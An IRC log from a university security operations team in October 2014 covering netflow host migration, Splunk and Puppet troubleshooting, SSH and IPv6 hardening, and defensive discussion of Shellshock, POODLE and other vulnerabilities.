2014-10-06 14:41:56	soehlert	i think i need to reboot, is that cool?
2014-10-06 14:43:37	jazoff	sure
2014-10-06 14:44:37	jazoff	WAT
2014-10-06 14:44:40	jazoff	*Open to public Internet but only responds to VNC traffic
2014-10-06 14:44:45	jazoff	'only'
2014-10-06 14:44:46	soehlert	yaaaaa i saw that too
2014-10-06 14:45:03	jazoff	is it fair to tell them limit to VPN ?
2014-10-06 14:45:09	jazoff	cause VNC would NEVER have a security issue
2014-10-06 14:45:38	soehlert	i dont know since there's the Cat people to worry about
2014-10-06 14:45:44	jazoff	hmm
2014-10-06 14:48:57	eyrich	whats the current box with the flow tools?
2014-10-06 14:49:14	jazoff	flows-sec
2014-10-06 14:49:25	soehlert	depends on what you mean by flow tools?
2014-10-06 14:49:25	soehlert	doesn't lowp do the frontend stuff for flows?
2014-10-06 14:49:53	eyrich	i thought lowp was just the nfs mount point for the flow files
2014-10-06 14:50:16	soehlert	there was some limitation on the front end thing that made jazoff have to put it there
2014-10-06 14:50:17	jazoff	yes, it is
2014-10-06 14:50:33	eyrich	we are collecting flows on out NFS mount box?
2014-10-06 14:50:36	eyrich	ok....
2014-10-06 14:50:49	soehlert	no thats where they are archived at
2014-10-06 14:50:56	soehlert	they are collected on flows-se
2014-10-06 14:51:05	eyrich	ok, thats what I wanted to know
2014-10-06 14:51:18	jazoff	ok.. so it may be confusing
2014-10-06 14:51:25	jazoff	the flow data is collected locally
2014-10-06 14:51:43	jazoff	there is a cron job that runs hourly:
2014-10-06 14:51:44	jazoff	10 * * * * mount | grep -q /data/nfdump && rsync -a /usr/local/nfsen/profiles-data/live/netdata/ /data/nfdump/
2014-10-06 14:51:45	jazoff	that syncs up logs to lowp
2014-10-06 14:51:45	eyrich	I thought we fixed the bottle neck issues on lowp by replacing patch cables
2014-10-06 14:52:37	jazoff	going to head out for a run before 5pm hits and traffic gets crazy, be back shortly
2014-10-06 15:51:10	soehlert	jazoff: we now have space on the new flows-sec
2014-10-06 15:51:54	soehlert	doesn't really affect me or NCSA stuff, but jazoff and jschipp you guys might find use in this: https://github.com/blog/1901-managing-issues-and-pull-requests-across-repositories
2014-10-06 16:07:28	soehlert	how are we handling vulnerable shellshock machines?
2014-10-06 16:29:33	soehlert	jazoff: you back?
2014-10-06 16:29:45	jazoff	yes
2014-10-06 16:29:48	jazoff	just arrived
2014-10-06 16:29:56	soehlert	flows is ready for rsync
2014-10-06 16:30:01	jazoff	ok
2014-10-06 16:30:38	jazoff	syncing
2014-10-06 16:30:43	soehlert	ok
2014-10-06 16:33:07	jazoff	there's like 60g to sync over
2014-10-06 16:33:20	soehlert	alright, so we'll finish that up tomorrow haha
2014-10-06 16:33:43	jazoff	yeah.. tomorrow is my flight to SF and the start of the crazy, but we should have time
2014-10-06 16:33:55	jazoff	i don't think this is really anything to do.. if not for the needing to rsync we could switch now
2014-10-06 16:33:57	soehlert	ahh right
2014-10-06 16:34:31	soehlert	ok well we should be able to finish it up real quick tomorrow. and where are we at with the myricom stuff? i think we're ready for me to work on it one machine at a time right? using a temp machine?
2014-10-06 16:37:42	jazoff	yeah.. so what I want to do...
2014-10-06 16:37:52	jazoff	have eyrich  take one or two of the machines out of the load balancing
2014-10-06 16:38:05	jazoff	then we can centos it and add it back if things look good
2014-10-06 16:38:07	jazoff	then do the other 6
2014-10-06 16:38:17	jazoff	should be pretty painless... supercell on the other hand a little trickier
2014-10-06 16:38:22	jazoff	but we can work out the kinks on the workers
2014-10-06 16:38:31	jazoff	brb, going food shopping
2014-10-06 16:38:46	soehlert	how much time do you think we need in between doing the first two and then the next two?
2014-10-06 17:05:01	jschipp	I wrote a Bro script for the rsyslog PRI vulnerability, does that go on bro-dev?
2014-10-06 17:41:22	soehlert	ya
2014-10-06 18:39:38	jazoff	soehlert: not long
2014-10-06 18:39:58	jazoff	maybe let the 2 work for a day and see if any issues come up and do the rest the next day
2014-10-07 07:54:47	eyrich	is splunk borked - i am unable to get a login page
2014-10-07 08:35:34	wraquel	eyrich: seems to work
2014-10-07 08:36:05	wraquel	uh oh
2014-10-07 08:36:20	wraquel	jazoff: got a license warning
2014-10-07 08:37:56	wraquel	looks like the bro_weird index spiked
2014-10-07 08:38:03	wraquel	and syslog....
2014-10-07 08:41:12	wraquel	TCP 0 scanning
2014-10-07 08:41:17	wraquel	huge uptick
2014-10-07 08:42:07	wraquel	I'm wondering if we should bhr tcp 0 scanners
2014-10-07 09:01:54	wraquel	Do we have nfsen running anywhere?
2014-10-07 09:37:52	soehlert	jazoff: since that's the case, i'm going to wait until i'm back from vacation so the cluster isn't half and half for a week. 
2014-10-07 09:38:22	soehlert	wraquel: nfsen is on flows-sec
2014-10-07 09:40:00	wraquel	right
2014-10-07 10:51:17	eyrich	getting errors in flow data
2014-10-07 10:51:19	eyrich	Skip unknown record type 7
2014-10-07 10:51:19	eyrich	Skip unknown record type 9
2014-10-07 10:51:19	eyrich	Skip unknown record type 8
2014-10-07 10:52:26	eyrich	still no access to splunk. did firewall rules get screwed up and disallow sects01?
2014-10-07 10:54:54	soehlert	eyrich: booraglio is lookin for ya
2014-10-07 11:01:14	eyrich	im in the active shooter training
2014-10-07 11:01:20	soehlert	ahh ok
2014-10-07 11:13:12	jschipp	TCPwrappers support is being removed from OpenSSH 6.7 when it comes out
2014-10-07 11:13:55	jschipp	intention is to use the Match directives for ACL's
2014-10-07 11:13:58	soehlert	interesting. i wonder why
2014-10-07 11:14:01	soehlert	ahh.
2014-10-07 11:14:08	jschipp	http://lwn.net/Articles/609321/
2014-10-07 11:53:27	wraquel	soehlert: in case you want to print to the printer by Deanna: https://wiki.ncsa.illinois.edu/display/ITS/Macintosh+Printing it's copy2036pub
2014-10-07 11:53:36	wraquel	the color one is clr2036pub
2014-10-07 11:53:41	soehlert	thanks
2014-10-07 12:18:18	soehlert	what are we doing to machines that are vulnerable to shellshock?
2014-10-07 12:18:31	soehlert	leo3vm20 is getting hit hard the last few days
2014-10-07 12:34:24	jschipp	http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html
2014-10-07 12:34:33	jschipp	^that would probably get me
2014-10-07 12:36:06	wraquel	that formatting gives me a headache
2014-10-07 12:37:47	jschipp	yeah, he could of done a better change with that
2014-10-07 12:37:52	jschipp	better job*
2014-10-07 12:52:10	jschipp	the bro-dev cluster doesn't seem to be seeing any traffic destined to our syslog infrastructure
2014-10-07 12:52:13	jschipp	:(
2014-10-07 12:53:14	jschipp	err, I take that back but not from 141.142.148.33
2014-10-07 12:53:35	jschipp	it's missing a lot of it for sure
2014-10-07 13:01:30	jschipp	if of interest, read one of the syslog RFC's yesterday and wrote this to display possible PRI combinations: for pri in {1..1016}; do FAC="$((pri/8))"; echo -e -n "PRI:$pri Fac:$FAC Sev:$((pri - ($FAC * 8 )))\n"; done
2014-10-07 13:02:17	jschipp	anything above 191 is invalid i.e. doesn't follow the protocol
2014-10-07 13:03:38	wraquel	bro only records traffic over taps. If it's on the same lan it likely won't go over a tap.
2014-10-07 13:03:47	wraquel	er processes
2014-10-07 13:04:08	soehlert	but the syslog infrastructure has its own subnet
2014-10-07 13:05:10	wraquel	right, but is there a tap that will pick up traffic from 148.33 to the syslog ip?
2014-10-07 13:05:25	jschipp	wraquel: ah, that's it
2014-10-07 13:05:32	soehlert	that's true. i doubt we tap anywhere to pick up between our own subnets
2014-10-07 13:05:37	jschipp	I was sending from a machine on the same subnet
2014-10-07 13:05:40	soehlert	its mostly just at the intersection of zones
2014-10-07 13:07:29	eyrich	and zones right now are basiclaly just the buildings.
2014-10-07 13:07:47	eyrich	if you arent leaving ncsa or npcf you dont get tapped
2014-10-07 13:09:14	jschipp	ah, ferk, yeah, not working by sending from the prv network either
2014-10-07 13:09:39	jschipp	will test another way
2014-10-07 13:10:09	soehlert	idk what you're doing, but you can test from dew maybe? it's in NCSA and on a totally different subnet
2014-10-07 13:19:38	wraquel	And God said, "let there be toner".
2014-10-07 13:20:56	wraquel	Doesn't sound much better....
2014-10-07 13:38:07	wraquel	jschipp: honestly, I haven't looked at the rsyslog priv issue. Can you field questions for it at the BW meeting?
2014-10-07 13:38:34	wraquel	jenos will really only be concerned if it's something that needs to be patched on bw.
2014-10-07 13:41:19	<--	wraquel (wraquel@hidden-EA35C84E.ncsa.illinois.edu) has quit (Quit: brb)
2014-10-07 13:42:10	-->	wraquel (wraquel@hidden-3819C22F.ncsa.illinois.edu) has joined #security
2014-10-07 13:44:32	jschipp	wraquel: kk
2014-10-07 13:52:43	eyrich	this is the URL for splunk right? https://cyclone.ncsa.illinois.edu:8000/
2014-10-07 13:57:21	soehlert	ya. that's where the portal link takes me and im seeing a login screen
2014-10-07 15:17:59	eyrich	from sects01?
2014-10-07 15:18:06	soehlert	ah no
2014-10-07 15:18:12	soehlert	lemme check the iptables rules on there one sec
2014-10-07 15:18:33	soehlert	ACCEPT     tcp  --  141.142.148.61       0.0.0.0/0           multiport dports 8000 /* 200 splunk http from bastians - sects01 */
2014-10-07 15:19:45	eyrich	bastions not bastian (thats the guy from never ending story)
2014-10-07 15:19:54	soehlert	haha i know i just fixed that when i saw it
2014-10-07 15:33:00	eyrich	it was a chrome problem
2014-10-07 15:33:09	soehlert	ok good
2014-10-07 17:38:24	jazoff	so, I fail at timezones
2014-10-07 17:38:52	jazoff	when the flight info says leaves at 10something and arrives 12something that doesn't mean it's a 2 hour flight :)
2014-10-07 17:39:17	jazoff	thought I was getting here a few hours ago 
2014-10-08 08:56:40	wraquel	wasn't there some interested in testing out Kabana?
2014-10-08 09:00:46	jazoff	kibana?
2014-10-08 09:05:02	wraquel	yes. The caffeined version of kabana....
2014-10-08 09:05:09	 *	wraquel sips coffee
2014-10-08 09:10:09	soehlert	i'm feeling under the weather and i dont want to be sick for my trip so i'm going to rest up. i'll probably do some work from home later on
2014-10-08 09:15:24	jazoff	soehlert: lemme know if you want to do the flows-sec thing at some point
2014-10-08 09:15:43	jazoff	yeah.. so I don't think kibana is terribly useful right now
2014-10-08 09:29:22	wraquel	too limited?
2014-10-08 09:32:12	jazoff	yeah, especially since we have splunk
2014-10-08 09:32:29	wraquel	Good news. Splunk should be available by mid Oct.
2014-10-08 09:32:40	wraquel	Er, licenses.
2014-10-08 09:32:49	wraquel	Through campus. We can scale back up.
2014-10-08 09:33:37	wraquel	How soon can you get a Splunk v6 cluster ready to go?
2014-10-08 09:33:55	jazoff	I think it's fairly straightforward
2014-10-08 09:34:09	jazoff	I just need to re-read the cluster setup docs to see if anything has changed since the last time I looked them over
2014-10-08 09:34:22	wraquel	And need 2 physical systems to put the cluster on?
2014-10-08 09:34:29	jazoff	I think it's one of those 90% planning 10% work kinds of things
2014-10-08 09:34:31	jazoff	yeah
2014-10-08 09:34:39	wraquel	good.
2014-10-08 09:34:44	jazoff	the search head/cluster manager thing can be vms
2014-10-08 09:36:19	wraquel	Can we get supercell to send data to both cyclone and the new splunk server at the same time?
2014-10-08 09:36:41	wraquel	Since they'll be running different versions for the time beaing?
2014-10-08 09:36:51	wraquel	...
2014-10-08 09:36:57	jazoff	yeah, you can
2014-10-08 09:37:14	jazoff	the forwardards are usually forward compatible
2014-10-08 09:37:29	jazoff	so an older forwarder can send to a newer splunk
2014-10-08 09:44:57	jazoff	I did that at UA when I switched from my splunk server to the central one
2014-10-08 11:47:42	jschipp	wraquel: how come you're never available on Lync
2014-10-08 11:53:12	jschipp	hmm they changed the directorate list on the staffdev page, shows: DO, MS, SciTech, and SpecProj
2014-10-08 11:53:17	jschipp	Anyone know which one?
2014-10-08 11:56:50	jschipp	nvm, Adam said it's SciTech
2014-10-08 12:12:42	jazoff	eyrich: is one supposed to use the NCSA login or the campus login when logging in to RT?
2014-10-08 12:29:15	soehlert	jazoff: i use the NCSA login
2014-10-08 13:35:00	soehlert	jazoff: wanna do flows-sec?
2014-10-08 13:44:04	wraquel	jschipp: Cause I'm not in the office?
2014-10-08 13:44:07	wraquel	I am now though
2014-10-08 13:44:41	wraquel	jschipp: use the NCSA login, otherwise it doesn't know your association with the NCSA groups.
2014-10-08 13:45:00	soehlert	that was jazoff not jschipp 
2014-10-08 13:45:17	wraquel	?
2014-10-08 13:45:20	wraquel	oh right
2014-10-08 13:45:28	wraquel	yes, jazoff , use NCSA login
2014-10-08 13:46:11	wraquel	Are there any pressing issues to discuss this week for the whiparound? I know Eyrich wants to talk about anomaly detection through bro but he's over at NPCF.
2014-10-08 13:47:00	soehlert	ah hell that's half the reason I showed up
2014-10-08 13:47:40	wraquel	We can still talk about it, it just may be that Eyrich won't be here.
2014-10-08 13:47:48	wraquel	Not sure if or when he's heading back over here.
2014-10-08 13:48:00	soehlert	well it's mostly him i wanted to discuss with. i think him and i are on different pages
2014-10-08 13:51:48	wraquel	may be a quick meeting then
2014-10-08 13:58:38	jschipp	be there in a sec
2014-10-08 14:00:08	wraquel	217-300-3465
2014-10-08 14:01:52	wraquel	we meetin?
2014-10-08 14:36:14	jazoff	sycning
2014-10-08 14:37:57	jazoff	ok
2014-10-08 14:38:00	jazoff	ready for switch
2014-10-08 14:40:41	soehlert	ok moved the current one to .48 on both subnets for right now
2014-10-08 14:43:53	soehlert	ok new one on the right ips. gotta add kerb
2014-10-08 14:45:25	soehlert	ok kerb ready on flows-sec
2014-10-08 14:45:34	soehlert	lemme know if you see issues
2014-10-08 14:48:32	jazoff	i think it's working
2014-10-08 14:49:06	jazoff	can you disable puppet on the old one and unmount the lowp mountpoint?
2014-10-08 14:49:32	soehlert	oh right
2014-10-08 14:51:43	soehlert	i switched their environment and unmounted lowp from old one
2014-10-08 14:51:51	soehlert	doesn't seem to be mounting on the new one though...
2014-10-08 14:53:15	jazoff	right.. the new one is in development
2014-10-08 14:53:21	soehlert	no its not
2014-10-08 14:53:24	soehlert	i switched it
2014-10-08 14:53:32	jazoff	oh, I may have taked it out of heridata
2014-10-08 14:53:55	soehlert	i thoguht you only took it out for development which is why i switched them
2014-10-08 14:54:26	jazoff	yeah.. you did the right thing
2014-10-08 14:54:41	soehlert	ok do you need me to do something else to fix it then?
2014-10-08 14:54:45	jazoff	nope, I got it
2014-10-08 14:54:54	jazoff	apparently we took it out of production in the last changed and never fixed it :)
2014-10-08 14:55:06	soehlert	ahhh
2014-10-08 15:08:00	jazoff	looks good
2014-10-08 15:09:37	jazoff	archive cron job runs in 30 seconds
2014-10-08 15:09:46	soehlert	sweet
2014-10-08 15:10:19	jazoff	worked
2014-10-08 15:10:28	soehlert	even sweeter
2014-10-08 15:10:36	jazoff	puppet ftw
2014-10-08 15:11:07	soehlert	as i get squid-sec ready to deploy on the 10.5....i can agree to that
2014-10-09 10:48:13	eyrich	jazoff: you there?
2014-10-09 10:55:55	jazoff	hi
2014-10-09 10:56:29	eyrich	can i restart splunk manager? I increased interface session logout time
2014-10-09 10:56:36	jazoff	sure
2014-10-09 11:01:05	eyrich	ok, interface session is now 30d
2014-10-09 11:02:04	eyrich	heading home for lunch
2014-10-09 11:05:08	jazoff	cool.. that always annoyed me but I never thought to see if it was an option
2014-10-09 12:28:39	wraquel	jazoff: did bob send you guys use cases for the certificate stuff?
2014-10-09 12:31:22	jazoff	not that I saw
2014-10-09 12:39:33	jazoff	going to run out and get something to eat
2014-10-09 12:39:43	jazoff	there's one of them in and out places near here
2014-10-09 12:40:37	wraquel	Oh
2014-10-09 12:40:40	wraquel	You're in california.
2014-10-09 12:40:43	wraquel	I hate you.
2014-10-09 13:24:56	jazoff	:)
2014-10-09 13:25:09	jazoff	I got a double double protien style
2014-10-09 13:42:51	eyrich	jazoff: can you look at splunk report CA - CRL - exsessive and tell me why it isnt emailign reports
2014-10-09 13:44:20	jazoff	sure
2014-10-09 13:48:22	jazoff	i added index=bro_bulk 
2014-10-09 13:48:27	jazoff	not sure if that will help though
2014-10-09 13:48:37	eyrich	still no emails
2014-10-09 13:51:23	jazoff	i see
2014-10-09 13:51:24	jazoff	index=_internal crl exsessive status
2014-10-09 13:51:34	jazoff	shows up as  status=skipped
2014-10-09 13:58:46	eyrich	thoughts on why?
2014-10-09 14:02:57	jazoff	not sure..
2014-10-09 14:03:01	jazoff	i changed it to run every 5 minutes..
2014-10-09 14:03:06	jazoff	did that help?
2014-10-09 14:06:20	eyrich	no we started out that way, but didnt want to wait between times
2014-10-09 14:11:06	jazoff	oh. well that would not have done what you wanted anyway
2014-10-09 14:11:14	jazoff	it would have spammed you with the same ips every minute
2014-10-09 14:11:40	eyrich	i know - i as going to change it to 24 hours once we got it to send any email
2014-10-09 14:11:46	jazoff	ah
2014-10-09 14:11:51	jazoff	not sure why it is skipping it...
2014-10-09 14:11:56	jazoff	clearly it is doing it for a reason
2014-10-09 14:12:02	jazoff	i don't think  i've ever seen that before
2014-10-09 14:17:06	eyrich	what next?
2014-10-09 14:22:07	jazoff	try creating the search from scratch
2014-10-09 14:22:18	jazoff	just copy the string into a new one and see what happens
2014-10-09 14:22:28	jazoff	this is a new one for me :)
2014-10-09 14:29:28	eyrich	working now, i made this one as admin and scheduled. previous one I had made as eyrich and tried to schedule as admin
2014-10-09 14:29:39	eyrich	eyrich did not have priv to schedule
2014-10-09 14:38:24	jazoff	ahhhh
2014-10-09 16:33:51	<--	jschipp (jschipp@hidden-E95C13A8.ncsa.illinois.edu) has quit (Ping timeout)
2014-10-10 10:59:49	jazoff	hmm, cyclone seems to have lost it's puppet role/profile
2014-10-10 11:01:17	jazoff	ah, looks like someone moved it to puppet-sec, but the role is not specified there
2014-10-10 11:05:12	jazoff	all fixed...
2014-10-10 11:05:21	jazoff	some logs going to be missing in splunk since yesterday though
2014-10-10 16:46:24	-->	jschipp (jschipp@hidden-E95C13A8.ncsa.illinois.edu) has joined #security
2014-10-10 16:57:47	<--	jschipp (jschipp@hidden-E95C13A8.ncsa.illinois.edu) has quit (Quit: Changing server)
2014-10-10 16:59:58	-->	jschipp (jschipp@hidden-E95C13A8.ncsa.illinois.edu) has joined #security
2014-10-10 17:01:15	jschipp	err, irssi stops responding at least once a week :/
2014-10-13 11:41:54	jschipp	ah, peace at last ;)
2014-10-13 13:50:12	jschipp	vuln in OpenSSH: http://seclists.org/fulldisclosure/2014/Oct/35
2014-10-13 13:50:26	jschipp	/proc/self/mem ftw
2014-10-14 15:38:25	jschipp	*crickets*
2014-10-14 22:19:53	wraquel	https://www.openssl.org/~bodo/ssl-poodle.pdf
2014-10-15 08:03:26	eyrich	ya - not really worried. We had already told people to diable sslv3 in spring of 2013
2014-10-15 08:56:38	wraquel	ie nodes apparently are still heavy users.
2014-10-15 09:07:20	<--	wraquel (wraquel@hidden-3819C22F.ncsa.illinois.edu) has quit (Quit: leaving)
2014-10-15 09:09:05	-->	wraquel (wraquel@hidden-3819C22F.ncsa.illinois.edu) has joined #security
2014-10-15 09:09:10	<--	wraquel (wraquel@hidden-3819C22F.ncsa.illinois.edu) has quit (Quit: wraquel)
2014-10-15 09:09:32	-->	wraquel (wraquel@hidden-3819C22F.ncsa.illinois.edu) has joined #security
2014-10-15 10:03:13	eyrich	good thing people are probaly not doing hpss transfers from bad actor wifi hot spots
2014-10-15 10:17:59	eyrich	ok, im trying to find communication from 64.39.106.167 in splunk
2014-10-15 10:18:07	eyrich	what is the search going to look like
2014-10-15 10:18:07	eyrich	?
2014-10-15 10:18:23	eyrich	because host=64.39.106.167/32 is not getting me results for the last 24 hours
2014-10-15 10:18:29	eyrich	and I know it should
2014-10-15 10:55:18	wraquel	just put in the IP address itself.
2014-10-15 10:55:46	wraquel	host is a specific field in, I think, the syslog index.
2014-10-15 10:55:56	eyrich	that worked thanks
2014-10-15 10:56:20	wraquel	id_orig_h=64.39.106.167 or id_resp_h=64.39.106.167 also works.
2014-10-15 10:57:57	wraquel	Not sure I care about the hpss mover stuff. What could an attacker gain? There are not authentication cookies in plaintext.
2014-10-15 10:58:17	eyrich	not sure
2014-10-15 10:58:29	eyrich	do we not send flows into splunk?
2014-10-15 10:58:40	wraquel	No.
2014-10-15 10:58:48	wraquel	not until we get a bigger license.
2014-10-15 10:58:52	wraquel	You'll have to use lowp for that.
2014-10-15 10:58:55	wraquel	or flow-sec
2014-10-15 10:59:25	wraquel	or both.
2014-10-15 11:01:02	wraquel	and, of course, webmail.illinois.edu accepts sslv3
2014-10-15 11:01:10	eyrich	nice
2014-10-15 11:03:45	jschipp	I want to kill nagios...
2014-10-15 11:04:00	wraquel	I think the CA team would agree with you.
2014-10-15 11:05:28	jschipp	I get the CA pager text on the dev server but not the prod. and I don't see how they are any different
2014-10-15 11:05:43	wraquel	routing?
2014-10-15 11:05:53	jschipp	no, everything else works, using same mail server
2014-10-15 11:05:56	wraquel	Can it actually get out?
2014-10-15 11:05:58	wraquel	ah
2014-10-15 11:24:45	jazoff	does the mail log indicate that the message was sent?
2014-10-15 11:44:06	jschipp	no, it's not the mail, networking, etc., it's nagios not scheduling it
2014-10-15 11:45:11	jschipp	but I think I have a grasp on the issue now
2014-10-15 11:59:37	jschipp	hmmm, so the OSSEC iptables ruels on tempest were removed somewhow on Friday so we were not recieving any alerts
2014-10-15 11:59:58	jschipp	I added them manually for now because puppet doesn't seem to be adding them
2014-10-15 12:00:12	jschipp	but need to figure out why becuase I'm sure it will overwrite it soon
2014-10-15 12:01:16	jschipp	I didn't see any changes in git
2014-10-15 12:02:11	jschipp	but the crashplan module is changing files for every puppet run and nothing runs after so I feel like that may be causing it
2014-10-15 12:02:36	jschipp	not even reverting the iptables rules back after manual run
2014-10-15 12:05:43	jazoff	jschipp: does /etc/motd show the right role/profile?
2014-10-15 12:06:16	jazoff	some machines aren't set right in the dashboard which makes the classes not get applie
2014-10-15 12:06:19	jazoff	d
2014-10-15 12:08:16	jschipp	ah, I think that's it. that must've been changed then
2014-10-15 12:08:33	jschipp	I wonder if that one was migrated to centos last week
2014-10-15 12:11:42	jazoff	is one of the reasons I don't really like the whole dashboard thing..
2014-10-15 12:11:56	jazoff	ends up being one more place (the database) that configurations are stored in rather than 100% in git
2014-10-15 12:12:56	jschipp	yeah, I agree
2014-10-15 12:42:58	jazoff	it's something to think about :)
2014-10-15 13:10:09	jschipp	so we don't have ipv6 iptables rules should probably set services to INET socket, pushing that up for ssh
2014-10-15 13:14:54	jazoff	ah
2014-10-15 13:15:13	jazoff	should be pretty easy to either disable ipv6 or push out the 2 rules you need to set ipv6 to default drop
2014-10-15 13:17:27	jschipp	yep, will do that too
2014-10-15 13:18:08	jschipp	err, the sshd (<6) version on our machines doesn't support AllowUsers in a Match directive :( 
2014-10-15 13:18:21	wraquel	wuh?
2014-10-15 13:18:27	jschipp	yeah, old sshd
2014-10-15 13:19:31	wraquel	Really... Huh... I assume that also means AllowGroups doesn't work in a Match either?
2014-10-15 13:19:37	wraquel	There goes that recommendation for iForge.
2014-10-15 13:20:01	jschipp	yep, it's not in man section
2014-10-15 13:20:19	jschipp	I think that came around release 6.0
2014-10-15 13:20:59	jschipp	even OSX has it and they're behind on everything unix user-ladn
2014-10-15 13:21:00	jschipp	land*
2014-10-15 13:21:05	jschipp	lol
2014-10-15 13:38:09	jazoff	well, blocking all ipv6 with iptables is easy enough
2014-10-15 13:38:21	jazoff	or with the kernel setting that completely disables it
2014-10-15 13:44:25	jschipp	yes, I add a sysctl module already
2014-10-15 13:46:51	jschipp	well, forgot to push all of it
2014-10-15 13:48:04	wraquel	sysctl or systemctl?
2014-10-15 13:48:11	wraquel	oh
2014-10-15 13:48:11	jschipp	sysctl
2014-10-15 13:48:11	wraquel	sysctl
2014-10-15 13:48:22	wraquel	I should read instead of skim.
2014-10-15 13:53:17	jschipp	:)
2014-10-15 13:56:21	jazoff	does redhat not support sysctl.d?
2014-10-15 14:00:55	jschipp	nope
2014-10-15 14:01:12	jschipp	* misses debian systems
2014-10-15 14:01:19	jazoff	lame
2014-10-15 14:01:32	jazoff	having one file makes it hard to manage using puppet
2014-10-15 14:01:50	jschipp	yeah
2014-10-15 14:01:56	jazoff	there are puppet helpers that can asemble a file based on fragments
2014-10-15 14:02:02	jazoff	but always easier when the config file natively supports it
2014-10-15 14:02:19	jazoff	maybe there is a sysctl module we could use that does that
2014-10-15 14:03:04	jazoff	jschipp: should add a notify to that module that notifies an Exec that runs sysctl -p
2014-10-15 14:03:10	jazoff	otherwise the changed sysctl.conf never gets applied
2014-10-15 14:07:54	jschipp	yeah, doing that now
2014-10-15 14:08:17	jschipp	do you need specific settings for your machines?
2014-10-15 14:08:38	jschipp	I imagine it's small enough that we could just a dynamic template with some conditionals
2014-10-15 14:09:04	jschipp	the only machine that I manage that uses specific sysctl settings is the nagios servers
2014-10-15 14:10:12	jazoff	not that I know of
2014-10-15 14:10:25	jazoff	the only thing I ever used to do was postgresql settings for the shared mem stuff
2014-10-15 14:10:27	jazoff	which looks like is already there
2014-10-15 14:12:26	jschipp	actually you can specify a filename with sysctl so we could put a custom one anywhere
2014-10-15 14:13:16	jschipp	/etc/sysctl-ncsa.conf
2014-10-15 14:13:21	jschipp	going to do that
2014-10-15 14:16:27	jazoff	but then that won't get loaded on boot
2014-10-15 14:18:31	jschipp	we can apply it on the first puppet run
2014-10-15 14:18:48	jschipp	not ideal but it'll work. but better is it write a script that will call it
2014-10-15 14:48:25	jschipp	there's an rc script now that'll run on boot
2014-10-15 14:52:03	 *	jschipp is going for a walk
2014-10-15 14:52:18	wraquel	jazoff: you have a list of sandwork indicators at all?
2014-10-15 14:52:23	wraquel	I haven't tried looking yet.
2014-10-15 15:00:15	jazoff	sandwork?
2014-10-15 15:00:38	jazoff	oh, the freenode thing?
2014-10-15 15:01:00	jazoff	sandworm?
2014-10-15 15:03:34	jazoff	there;s a thread on RI
2014-10-15 15:13:57	jazoff	wraquel: none of the ips talked about so far were communicated with
2014-10-15 15:21:59	wraquel	sandworm
2014-10-15 15:22:02	wraquel	right
2014-10-15 15:41:03	wraquel	jazoff: can you have jirabot also watch the jira CA project?
2014-10-15 15:44:04	jazoff	hmm
2014-10-15 15:45:58	jazoff	what would the query for that be?
2014-10-15 15:46:06	jazoff	currently we have assignee in (membersOf("org_irst"), security, secops_bot) and status!=Closed
2014-10-15 15:49:19	jazoff	which i think you came up with somehow :)
2014-10-15 15:52:33	jazoff	wraquel: so I've been looking over and thinking about the SSL cert thing
2014-10-15 15:52:52	jazoff	how many of those features do you think are just proxying the remote API vs. doing work locally and storing state?
2014-10-15 15:53:28	jazoff	seems like the remote api would be doing most of the heavy lifting, and the site itself would mostly be a middleman
2014-10-15 15:53:40	wraquel	ah
2014-10-15 15:54:01	wraquel	Yeah, that's my thought
2014-10-15 15:54:39	wraquel	Both CITES and us are using JIRA and InCommon for maintaining state.
2014-10-15 15:55:59	jazoff	if that's the case then most of the work would be in defining things like roles and access control policies
2014-10-15 15:56:25	wraquel	Yeah, the trick is that both NCSA and CITES will be using different back ends for ACLs.
2014-10-15 15:57:13	wraquel	And defining a consistent workflow between both institutions.
2014-10-15 16:31:32	jschipp	I'm thinking about learning ruby
2014-10-15 16:32:11	jschipp	anyone have reasons why I shouldn't, the CS students are really starting to get me to like it
2014-10-15 16:32:51	jschipp	jazoff: 
2014-10-15 17:52:55	jazoff	ruby isn't bad... but it's a bit more complicated than python
2014-10-16 08:44:38	wraquel	good for metasploit
2014-10-16 09:30:42	wraquel	jazoff: I think the big thing is the ability to self-service certificates.
2014-10-16 09:41:27	jazoff	yeah
2014-10-16 09:41:49	jazoff	and in that case it's mostly just proxying the reuest, right?
2014-10-16 09:42:29	jazoff	take csr, send to remote api, retrieve signed cert
2014-10-16 09:42:50	wraquel	yep
2014-10-16 09:42:57	wraquel	well, checking status for when the cert is ready.
2014-10-16 09:43:39	wraquel	That can either be done through either a cron job to check if the certificate is ready or watching a mail queue for email notification. I wish they had a push method. That would be cool.
2014-10-16 09:45:36	jazoff	i see
2014-10-16 09:51:18	jazoff	so I think my first goal is to read through allll the use cases and try to work out what state does need to be stored locally, and then work out a data model for it
2014-10-16 10:06:06	wraquel	If you do store state locally I suggest you make a plugin framework for it and do the state as it's own optional local state table. Otherwise the same functions could be used to call a library to access custom scripts for doing the same things through JIRA or whatever we want to do down the road. Just a thought.
2014-10-16 10:06:39	wraquel	or something like that.
2014-10-16 10:07:20	wraquel	Ideally I think this would be a cool tool that any Incommon institution could spin up and use.
2014-10-16 10:08:40	jazoff	hmm
2014-10-16 10:09:15	wraquel	But, the simpler the better, so, whatever gets the job done for now.
2014-10-16 10:10:20	wraquel	This is currently the project queue in Jira that we're using for certificate tracking: https://jira.ncsa.illinois.edu/browse/CA/
2014-10-16 10:23:14	jazoff	hmm
2014-10-16 10:23:32	jazoff	using jira for state might be tricky.. but having the system send updates to jira would be easy enough
2014-10-16 10:33:04	wraquel	Hmm... Well, yeah, but I think the state issue in JIRA is its own issue, apart from the CA application, we should define general state requirements for the application and go from there.
2014-10-16 10:33:57	wraquel	Like 'new request->CSR submitted->CER ready->CER issued to user (closed)
2014-10-16 10:34:07	wraquel	That's simplistic, but something like that.
2014-10-16 10:35:04	jazoff	yeah.. definitely the core of the app would be a state machine
2014-10-16 11:12:33	wraquel	jazoff: I sent you the use case link right? https://wiki.ncsa.illinois.edu/display/CSD/NCSA+CA+Use+Cases
2014-10-16 12:00:52	jazoff	yeah
2014-10-16 13:22:35	wraquel	http://141.142.41.18/Drupal/
2014-10-16 13:22:38	wraquel	smh
2014-10-16 13:23:48	wraquel	is netdot info available from ncsabot or the portal?
2014-10-16 13:24:17	wraquel	Need to know who is associated with 141.142.41.18 and 141.142.227.9
2014-10-16 13:25:42	wraquel	maybe gulp has something
2014-10-16 13:36:59	wraquel	jschipp: or jazoff any idea on how many ssh fail attemps that ossec blocks on?
2014-10-16 13:49:54	jazoff	wraquel: close to be.. I have a working plugin but we need to figure out the authentiation for it
2014-10-16 13:50:07	jazoff	    Name: 18.41.142.141.in-addr.arpa
